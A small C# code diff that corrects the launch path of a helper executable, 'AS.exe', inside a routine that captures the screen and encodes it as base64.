@@ -111,7 +111,7 @@ namespace SCSU
                 try
                 {
                     Process[] AS = Process.GetProcessesByName("AS");
-                    if (AS.Length <= 0) Process.Start("AS.exe");
+                    if (AS.Length <= 0) Process.Start("Program\\AS.exe");
                     Bitmap screen = CaptureImage(0);
                     string base64 = ToBase64(screen);
                     if (SystemInformation.MonitorCount > 1)
